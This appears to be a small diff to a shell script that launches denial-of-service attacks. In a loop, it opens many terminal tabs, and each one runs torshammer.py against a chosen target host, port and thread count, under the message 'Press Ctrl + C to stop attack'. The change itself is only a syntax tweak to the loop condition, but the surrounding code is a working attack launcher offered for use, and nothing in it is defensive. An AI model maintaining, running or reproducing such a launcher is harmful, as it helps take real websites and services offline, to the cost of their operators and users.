@@ -93,7 +93,7 @@ printf "\e[1;93m[*] Press Ctrl + C to stop attack \e[0m \n"
 i=1
 while true; do
   let i=1
-  while [ $i -le $inst ]; do
+  while [[ $i -le $inst ]]; do
 
 gnome-terminal --tab -- python torshammer/torshammer.py -t $target -p $portt -r $threads
 i=$((i+1))
